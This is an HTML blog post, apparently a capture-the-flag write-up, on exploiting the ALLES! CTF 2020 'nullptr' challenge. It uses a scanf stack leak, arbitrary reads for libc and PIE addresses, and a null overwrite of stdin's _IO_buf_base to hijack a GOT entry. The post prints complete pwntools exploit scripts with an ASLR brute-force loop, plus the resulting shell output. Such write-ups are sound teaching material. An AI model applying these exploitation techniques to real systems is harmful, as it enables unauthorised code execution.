@@ -1,0 +1,1365 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Source Themes Academic 4.8.0">
+
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="Kerro &amp; Anis_Boss">
+
+  
+  
+  
+    
+  
+  <meta name="description" content="Challenge Details    Event Challenge Category Link     ALLES! CTF 2020 nullptr PWN https://ctftime.org/event/1091    Description  Category:Binary Exploitation Difficulty:Medium/Hard Author:Flo First Blood:3k">
+
+  
+  <link rel="alternate" hreflang="en-us" href="/post/alles-ctf-2020-nullptr/">
+
+  
+
+
+  
+  
+  
+  <meta name="theme-color" content="rgb(0, 136, 204)">
+  
+
+  
+  
+
+  
+  
+  
+  
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.min.css" integrity="sha256-4w9DunooKSr3MFXHXWyFER38WmPdm361bQS/2KUWZbU=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/github.min.css" crossorigin="anonymous" title="hl-light" disabled>
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark">
+        
+      
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.css" integrity="sha256-SHMGCYmST46SoyGgo4YR/9AlK1vf3ff84Aq9yK4hdqM=" crossorigin="anonymous">
+    
+
+    
+
+    
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js" integrity="sha256-Md1qLToewPeKjfAHU1zyPwOutccPAm5tahnaw7Osw0A=" crossorigin="anonymous" async></script>
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+        
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=B612+Mono:400,700%7COrbitron:400,700&display=swap">
+  
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/academic.css">
+
+  
+
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177400255-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+
+  function gtag() {
+      dataLayer.push(arguments);
+  }
+
+  function trackOutboundLink(url, target) {
+    gtag('event', 'click', {
+         'event_category': 'outbound',
+         'event_label': url,
+         'transport_type': 'beacon',
+         'event_callback': function () {
+           if (target !== '_blank') {
+             document.location = url;
+           }
+         }
+    });
+    console.debug("Outbound link clicked: " + url);
+  }
+
+  function onClickCallback(event) {
+    if ((event.target.tagName !== 'A') || (event.target.host === window.location.host)) {
+      return;
+    }
+    trackOutboundLink(event.target, event.target.getAttribute('target'));  
+  }
+
+  gtag('js', new Date());
+  gtag('config', 'UA-177400255-1', {});
+
+  
+  document.addEventListener('click', onClickCallback, false);
+</script>
+
+
+  
+
+
+  
+  
+
+  
+
+  <link rel="manifest" href="/index.webmanifest">
+  <link rel="icon" type="image/png" href="/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_32x32_fill_lanczos_center_2.png">
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_192x192_fill_lanczos_center_2.png">
+
+  <link rel="canonical" href="/post/alles-ctf-2020-nullptr/">
+
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <meta property="twitter:card" content="summary">
+  
+  <meta property="og:site_name" content="pwn-diaries">
+  <meta property="og:url" content="/post/alles-ctf-2020-nullptr/">
+  <meta property="og:title" content="ALLES! CTF 2020   Nullptr | pwn-diaries">
+  <meta property="og:description" content="Challenge Details    Event Challenge Category Link     ALLES! CTF 2020 nullptr PWN https://ctftime.org/event/1091    Description  Category:Binary Exploitation Difficulty:Medium/Hard Author:Flo First Blood:3k"><meta property="og:image" content="/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_512x512_fill_lanczos_center_2.png">
+  <meta property="twitter:image" content="/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_512x512_fill_lanczos_center_2.png"><meta property="og:locale" content="en-us">
+  
+    
+      <meta property="article:published_time" content="2020-09-07T16:12:46&#43;01:00">
+    
+    <meta property="article:modified_time" content="2020-09-07T16:12:46&#43;01:00">
+  
+
+  
+
+
+    
+
+
+
+
+
+
+  
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "/post/alles-ctf-2020-nullptr/"
+  },
+  "headline": "ALLES! CTF 2020   Nullptr",
+  
+  "datePublished": "2020-09-07T16:12:46+01:00",
+  "dateModified": "2020-09-07T16:12:46+01:00",
+  
+  "author": {
+    "@type": "Person",
+    "name": "Kerro \u0026 Anis_Boss"
+  },
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "pwn-diaries",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_192x192_fill_lanczos_center_2.png"
+    }
+  },
+  "description": "Challenge Details    Event Challenge Category Link     ALLES! CTF 2020 nullptr PWN https://ctftime.org/event/1091    Description  Category:Binary Exploitation Difficulty:Medium/Hard Author:Flo First Blood:3k"
+}
+</script>
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+
+  <title>ALLES! CTF 2020   Nullptr | pwn-diaries</title>
+
+</head>
+
+<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="dark">
+
+  <aside class="search-results" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" spellcheck="false" type="search">
+        
+      </div>
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+  
+
+
+
+
+
+
+
+<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
+  <div class="container">
+
+    
+    <div class="d-none d-lg-inline-flex">
+      <a class="navbar-brand" href="/">pwn-diaries</a>
+    </div>
+    
+
+    
+    <button type="button" class="navbar-toggler" data-toggle="collapse"
+            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span><i class="fas fa-bars"></i></span>
+    </button>
+    
+
+    
+    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
+      <a class="navbar-brand" href="/">pwn-diaries</a>
+    </div>
+    
+
+    
+    
+    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
+
+      
+      <ul class="navbar-nav d-md-inline-flex">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#posts"><span>Posts</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#contact"><span>Contact</span></a>
+        </li>
+
+        
+        
+
+      
+
+        
+      </ul>
+    </div>
+
+    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
+      
+      <li class="nav-item">
+        <a class="nav-link js-search" href="#"><i class="fas fa-search" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+
+      
+
+    </ul>
+
+  </div>
+</nav>
+
+
+  <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+<div class="article-container pt-3">
+  <h1>ALLES! CTF 2020   Nullptr</h1>
+
+  
+
+  
+    
+
+
+<div class="article-metadata">
+
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Sep 7, 2020
+  </span>
+  
+
+  
+
+  
+  <span class="middot-divider"></span>
+  <span class="article-reading-time">
+    7 min read
+  </span>
+  
+
+  
+  
+  
+
+  
+  
+
+</div>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h4 id="challenge-details">Challenge Details</h4>
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Link</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ALLES! CTF 2020</td>
+<td>nullptr</td>
+<td>PWN</td>
+<td><a href="https://ctftime.org/event/1091">https://ctftime.org/event/1091</a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="description">Description</h3>
+<blockquote>
+<p>Category:<strong>Binary Exploitation
+</strong>Difficulty:<strong>Medium/Hard
+</strong>Author:<strong>Flo
+</strong>First Blood:3k</p>
+<p><strong>Solved By:</strong> 3k, RPISEC, DiceGang, RedRocket (4 solves)</p>
+<p>Welcome to the House Of <em>I&rsquo;m pretty sure this is not even a heap challenge</em>.</p>
+<p><strong>Challenge Files:</strong>
+<a href="https://static.allesctf.net//d74dcd7033502679623abc5c15666791f4faeae11245dafa02d4c5617e3a6dcd/nullptr.zip" target="_blank" rel="noopener">nullptr.zip</a></p>
+<pre><code class="language-bash">ncat --ssl 7b000000455b22693d06c5a7.challenges.broker5.allesctf.net 1337
+</code></pre>
+</blockquote>
+<p>We participated in ALLES! CTF 2020 with 
+<a href="https://ctftime.org/team/110885" target="_blank" rel="noopener">the3000</a> team, and we ranked 8th at the end \o/ !</p>
+<h3 id="tldl">TL;DL</h3>
+<ul>
+<li>
+<p>Leak stack pointer using logic bug in scanf format string.</p>
+</li>
+<li>
+<p>Leak <strong>Libc</strong> and <strong>PIE</strong> addresses through arbitrary read using already given functionality.</p>
+</li>
+<li>
+<p>Use arbitrary null pointer to overwrite **_IO_buf_base ** of stdin structure.</p>
+</li>
+<li>
+<p>Get a shell \o/.</p>
+</li>
+</ul>
+<p>As Detailed in the description of the challenge, the author provided the necessary files to run the binary as intended which include the binary, Dockerfile and source code file.</p>
+<h2 id="reverse-engineering">Reverse Engineering</h2>
+<h4 id="static-analysis">Static Analysis</h4>
+<p>We were give the source code of the application which makes it easier for us to analyze it and a 64 bits  executable not stripped and dynamically linked as shown below:</p>
+<pre><code class="language-bash">$ file nullptr
+nullptr: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dc37e094d9cc17b7b9c50eeba3a7100d412954d3, for GNU/Linux 3.2.0, with debug_info, not stripped
+
+</code></pre>
+<p>Also we have an idea about the **Libc ** (libc 2.30) used since we have the Dockerfile which includes the ubuntu version used on the remote server.</p>
+<p>The given binary has nearly full protection except <strong>Partial Relro</strong> as shown below:</p>
+<pre><code class="language-bash">$ checksec ./nullptr
+[*] '/tmp/kek/nullptr'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<h4 id="source-code-analysis">Source Code analysis</h4>
+<p>Let&rsquo;s start with the <code>main</code> function:</p>
+<pre><code class="language-c">int main(void) {
+    unsigned long addr;
+    int menuchoice;
+    while (1) {
+        printf(&quot;[1. view, 2. null, -1. exit]&gt; \n&quot;); fflush(stdout);
+        scanf(&quot;%d&quot;, &amp;menuchoice); getc(stdin);
+        switch (menuchoice) {
+        case 1:
+            printf(&quot;view address&gt; \n&quot;); fflush(stdout);
+            scanf(&quot;%lu&quot;, &amp;addr); getc(stdin);
+            printf(&quot;%p: %p\n&quot;, addr, *(void**)addr);
+            break;
+        case 2:
+            printf(&quot;nuke address&gt; \n&quot;); fflush(stdout);
+            scanf(&quot;%lu&quot;, &amp;addr); getc(stdin);
+            *(void**)addr = NULL;
+            printf(&quot;ok!\n&quot;);
+            break;
+        case -1:
+            printf(&quot;bye!\n&quot;);
+            return 1;
+        default:;
+        }
+    }
+    return 0;
+}
+</code></pre>
+<p>the main subroutine introduces 3 choices as following:</p>
+<ol>
+<li><code>View address</code>: Reads a long unsigned number  using &lsquo;%lu&rsquo; format string of <code>scanf</code> and print out the address of <code>addr</code> variable alongside the content of the pointer supplied by the user which means the content of the pointer contained in <code>addr</code> variable.</li>
+<li><code>Nuke address</code> : Reads a long unsigned number  using &lsquo;%lu&rsquo; format string of <code>scanf</code> and overwrite the content of given address with null bytes (QWORD).</li>
+<li><code>exit</code>: Print out a message then returns.</li>
+</ol>
+<p>Besides the <code>main</code> function, the author was too generous to provide us with a win function which executes a &lsquo;/bin/sh&rsquo;</p>
+<pre><code class="language-c">void get_me_out_of_this_mess() { execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL); }
+</code></pre>
+<h2 id="exploitation">Exploitation</h2>
+<h4 id="leaking-stack-address">Leaking Stack address</h4>
+<p>the binary has a logic bug, which can be abused by giving <code>scanf</code> a non-numeric input.</p>
+<p>if the conversion of the input to unsigned long fails, scanf will just free the used pointer and returns without modifying its second argument.</p>
+<pre><code class="language-c">if (flags &amp; NUMBER_SIGNED)
+    //Signed Number
+      num.l = __strtol_internal(char_buffer_start (&amp;charbuf), &amp;tw, base, flags &amp; GROUP);
+else
+     //Unsigned Number  (our case)
+      num.ul = __strtoul_internal(char_buffer_start (&amp;charbuf), &amp;tw, base, flags &amp; GROUP);
+            }
+//check if the input was converted successfully else it calls conv_error()
+if (__glibc_unlikely (char_buffer_start (&amp;charbuf) == tw))
+            conv_error (); //free the pointers and returns.
+</code></pre>
+<p>Trying this theory on the given binary reveals a stack leak.</p>
+<pre><code class="language-bash">$ ./nullptr 
+[1. view, 2. null, -1. exit]&gt; 
+1
+view address&gt; 
+a
+0x7fffe7280ad0: 0x1 #Stack Leak \o/
+[1. view, 2. null, -1. exit]&gt; 
+
+</code></pre>
+<p>It&rsquo;s time to start implementing the exploit.</p>
+<pre><code class="language-python">  from pwn import *
+  p = remote(&quot;172.17.0.2&quot;,1024)
+  p.recvline()
+  p.sendline(&quot;1&quot;)
+  p.recvline()
+  p.sendline(&quot;a&quot;)
+  data = p.recvline().strip().split(&quot;:&quot;)[0]
+  stack_leak = int(data,16)
+  print hex(stack_leak)
+
+</code></pre>
+<h4 id="leaking-libc--pie-addresses">Leaking Libc &amp; PIE addresses</h4>
+<p>Since we have a valid stack address and an arbitrary read, we can find an address on the stack that contains a <strong>PIE</strong> address and use <code>View address</code> to get its content. from that we can look for a <strong>Libc</strong> address in the binary.</p>
+<pre><code class="language-python">from pwn import *
+
+p = process(&quot;ncat --ssl 7b000000455b22693d06c5a7.challenges.broker5.allesctf.net 1337&quot;,shell=True)
+p.recvline()
+
+p.sendline(&quot;1&quot;)
+p.recvline()
+p.sendline(&quot;a&quot;)
+data = p.recvline().strip().split(&quot;:&quot;)[0]
+stack_leak = int(data,16)
+print hex(stack_leak)
+p.recvline()
+off1 = stack_leak + (0x108-(9*8)) #offset on the stack that contains PIE address.
+p.sendline(&quot;1&quot;)
+p.sendline(str(off1))
+p.recvline()
+
+pie_leak = int(p.recvline().strip().split(&quot;: &quot;)[1],16)
+p.recvline()
+print hex(pie_leak)
+
+off2 = pie_leak + 0x2f78 #offset in the binary that contains libc address.
+bin_base = pie_leak - 0x10a0
+win = bin_base + 0x1199
+got = bin_base + 0x4000
+print hex(bin_base)
+p.sendline(&quot;1&quot;)
+p.sendline(str(off2))
+p.recvline()
+libc_leak = int(p.recvline().strip().split(&quot;: &quot;)[1],16)
+libc_base = libc_leak - 0x87490
+print hex(libc_base)
+</code></pre>
+<h4 id="getting-shell">Getting shell</h4>
+<p>Since the binary is partial relro, our idea is to overwrite one of the GOT entries with the address of win function. But how can we do that with just a null byte overwrite?
+Let&rsquo;s examine the following <code>stdin</code> structure :</p>
+<pre><code class="language-c">gdb-peda$ p stdin
+$1 = (FILE *) 0x7ffff7f95980 &lt;_IO_2_1_stdin_&gt;
+gdb-peda$ p _IO_2_1_stdin_
+$2 = {
+  file = {
+    _flags = 0xfbad2288,
+    _IO_read_ptr = 0x5555555596b0 &quot;&quot;,
+    _IO_read_end = 0x5555555596b0 &quot;&quot;,
+    _IO_read_base = 0x5555555596b0 &quot;&quot;,
+    _IO_write_base = 0x5555555596b0 &quot;&quot;,
+    _IO_write_ptr = 0x5555555596b0 &quot;&quot;,
+    _IO_write_end = 0x5555555596b0 &quot;&quot;,
+    _IO_buf_base = 0x5555555596b0 &quot;&quot;,
+    _IO_buf_end = 0x555555559ab0 &quot;&quot;,
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x0,
+    _fileno = 0x0,
+    _flags2 = 0x0,
+    _old_offset = 0xffffffffffffffff,
+    _cur_column = 0x0,
+    _vtable_offset = 0x0,
+    _shortbuf = &quot;&quot;,
+    _lock = 0x7ffff7f984d0 &lt;_IO_stdfile_0_lock&gt;,
+    _offset = 0xffffffffffffffff,
+    _codecvt = 0x0,
+    _wide_data = 0x7ffff7f95a60 &lt;_IO_wide_data_0&gt;,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0x0,
+    _mode = 0xffffffff,
+    _unused2 = '\000' &lt;repeats 19 times&gt;
+  },
+  vtable = 0x7ffff7f974a0 &lt;_IO_file_jumps&gt;
+}
+gdb-peda$ 
+
+</code></pre>
+<p>when a <code>scanf </code> is used, it stores the input in the <strong>_IO_read_base</strong> which is a heap chunk pointer and then gets updated with   <strong>_IO_buf_base</strong> pointer.</p>
+<p>So our idea is to partially null-overwrite the <strong>_IO_buf_base</strong> in order to point to <code>GOT.plt</code> section  so the next <code>scanf </code> call will store our input in that location.</p>
+<p>Let&rsquo;s take a look at the memory mapping of our process:</p>
+<pre><code class="language-c">gdb-peda$ vmmap 
+Start              End                Perm	Name
+0x0000564c3b44e000 0x0000564c3b44f000 r--p	/tmp/kek/nullptr
+0x0000564c3b44f000 0x0000564c3b450000 r-xp	/tmp/kek/nullptr
+0x0000564c3b450000 0x0000564c3b451000 r--p	/tmp/kek/nullptr
+0x0000564c3b451000 0x0000564c3b452000 r--p	/tmp/kek/nullptr
+0x0000564c3b452000 0x0000564c3b453000 rw-p	/tmp/kek/nullptr //GOT.plt 
+0x0000564c3befc000 0x0000564c3bf1d000 rw-p	[heap]
+0x00007efdc0dd0000 0x00007efdc0df5000 r--p	/lib/x86_64-linux-gnu/libc-2.30.so
+0x00007efdc0df5000 0x00007efdc0f3f000 r-xp	/lib/x86_64-linux-gnu/libc-2.30.so
+0x00007efdc0f3f000 0x00007efdc0f89000 r--p	/lib/x86_64-linux-gnu/libc-2.30.so
+0x00007efdc0f89000 0x00007efdc0f8c000 r--p	/lib/x86_64-linux-gnu/libc-2.30.so
+0x00007efdc0f8c000 0x00007efdc0f8f000 rw-p	/lib/x86_64-linux-gnu/libc-2.30.so
+0x00007efdc0f8f000 0x00007efdc0f95000 rw-p	mapped
+0x00007efdc0fc5000 0x00007efdc0fc6000 r--p	/lib/x86_64-linux-gnu/ld-2.30.so
+0x00007efdc0fc6000 0x00007efdc0fe4000 r-xp	/lib/x86_64-linux-gnu/ld-2.30.so
+0x00007efdc0fe4000 0x00007efdc0fec000 r--p	/lib/x86_64-linux-gnu/ld-2.30.so
+0x00007efdc0fed000 0x00007efdc0fee000 r--p	/lib/x86_64-linux-gnu/ld-2.30.so
+0x00007efdc0fee000 0x00007efdc0fef000 rw-p	/lib/x86_64-linux-gnu/ld-2.30.so
+0x00007efdc0fef000 0x00007efdc0ff0000 rw-p	mapped
+0x00007ffc42b91000 0x00007ffc42bb2000 rw-p	[stack]
+0x00007ffc42bef000 0x00007ffc42bf3000 r--p	[vvar]
+0x00007ffc42bf3000 0x00007ffc42bf5000 r-xp	[vdso]
+
+</code></pre>
+<p>We noticed that the <code>GOT</code> &amp; <code>Heap</code> pointers have only 3 different bytes, what if due to <strong>ASLR</strong> the last 3 bytes of GOT&rsquo;s address are NULL, it will become <code>0x0000564c3b000000</code>.
+In this case, we can partially overwrite the  <strong>_IO_buf_base</strong>&rsquo;s last 3 bytes with <code>\x00</code> it will point to  binary&rsquo;s GOT section. Therefore,  the next <code>scanf</code> will read our input and store it into the GOT.</p>
+<p>Since our target is the base of the GOT section, the last 12 bits will always be zeros. So we have 12  bits affected by the ASLR to bruteforce. Our chance to pull this off is 2^12.</p>
+<p>Final Exploit:</p>
+<pre><code class="language-python">from pwn import *
+
+while True:
+    p = remote(&quot;172.17.0.2&quot;,1024)
+    p.recvline()
+
+    p.sendline(&quot;1&quot;)
+    p.recvline()
+    p.sendline(&quot;a&quot;)
+    data = p.recvline().strip().split(&quot;:&quot;)[0]
+    stack_leak = int(data,16)
+    print hex(stack_leak)
+    p.recvline()
+    off1 = stack_leak + (0x108-(9*8))
+    p.sendline(&quot;1&quot;)
+    p.sendline(str(off1))
+    p.recvline()
+    pie_leak = int(p.recvline().strip().split(&quot;: &quot;)[1],16)
+    p.recvline()
+    print hex(pie_leak)
+    off2 = pie_leak + 0x2f78
+    bin_base = pie_leak - 0x10a0
+    win = bin_base + 0x1199
+    got = bin_base + 0x4000
+    print hex(bin_base)
+    if got &amp; 0xfff000 == 0:
+        p.sendline(&quot;1&quot;)
+        p.sendline(str(off2))
+        p.recvline()
+        libc_leak = int(p.recvline().strip().split(&quot;: &quot;)[1],16)
+        libc_base = libc_leak - 0x87490
+        dl_runtime = libc_base + 0x20da30
+        print hex(libc_base)
+        buf_base = libc_base + 0x1ea9b3
+        p.recv(8000)
+        p.sendline(&quot;1&quot;)
+        p.recvline()
+        p.sendline(str(got))
+        addr1 = int(p.recvline().strip().split(&quot;: &quot;)[1],16)
+        p.recvline()
+        p.sendline(&quot;1&quot;)
+        p.recvline()
+        p.sendline(str(got+8))
+        addr2 = int(p.recvline().strip().split(&quot;: &quot;)[1],16)
+        p.recvline()
+        p.sendline(&quot;2&quot;)
+        p.sendline(str(buf_base))
+        payload = &quot;&quot;
+        payload += p64(addr1) 
+        payload += p64(addr2)
+        payload += p64(dl_runtime)
+        payload += p64(win)
+        print &quot;Getting shell \o/&quot;
+        p.sendline(payload)
+        p.interactive()
+        p.close()
+
+</code></pre>
+<p>Our target is puts&rsquo; GOT entry which is the fourth entry in the section, <code>addr1</code>,<code>addr2 </code> and <code>dl_runtime</code> are the first,  second and third entries, mandatory for the binary to continue execution smoothly.</p>
+<pre><code class="language-bash">$  python sploit.py
+[..]
+[+] Opening connection to 172.17.0.2 on port 1024: Done
+0x7ffcdd46ca50
+0x560459ffd0a0
+0x560459ffc000
+0x7f396bf9b000
+Getting shell \o/
+[*] Switching to interactive mode
+nuke address&gt; 
+ok!
+[1. view, 2. null, -1. exit]&gt; 
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ cat flag
+CSCG¬TEST_FLAG}
+$  
+</code></pre>
+<p>\o/ !</p>
+
+    </div>
+
+    
+
+
+
+
+
+
+
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=/post/alles-ctf-2020-nullptr/&amp;text=ALLES!%20CTF%202020%20%20%20Nullptr" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=/post/alles-ctf-2020-nullptr/&amp;t=ALLES!%20CTF%202020%20%20%20Nullptr" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=ALLES!%20CTF%202020%20%20%20Nullptr&amp;body=/post/alles-ctf-2020-nullptr/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=/post/alles-ctf-2020-nullptr/&amp;title=ALLES!%20CTF%202020%20%20%20Nullptr" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://web.whatsapp.com/send?text=ALLES!%20CTF%202020%20%20%20Nullptr%20/post/alles-ctf-2020-nullptr/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=/post/alles-ctf-2020-nullptr/&amp;title=ALLES!%20CTF%202020%20%20%20Nullptr" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hu06816a7876aa6880a23601647714be56_91504_270x270_fill_q90_lanczos_center.jpg" alt="Kerro &amp; Anis_Boss">
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="/">Kerro &amp; Anis_Boss</a></h5>
+      <h6 class="card-subtitle">Cyber Security Enthusiasts</h6>
+      <p class="card-text">Our research interests include Binary Exploitation, Reverse Engineering and Programming.</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+    <li>
+      <a href="mailto:oussama.kerro@pwn-diaries.com" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+    <li>
+      <a href="mailto:anis.hamdi@pwn-diaries.com" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/KerroOussama" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/AnisBoss_" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/KEERRO" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/AnisBoss" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  </div>
+</article>
+
+      
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+
+      
+
+      
+        
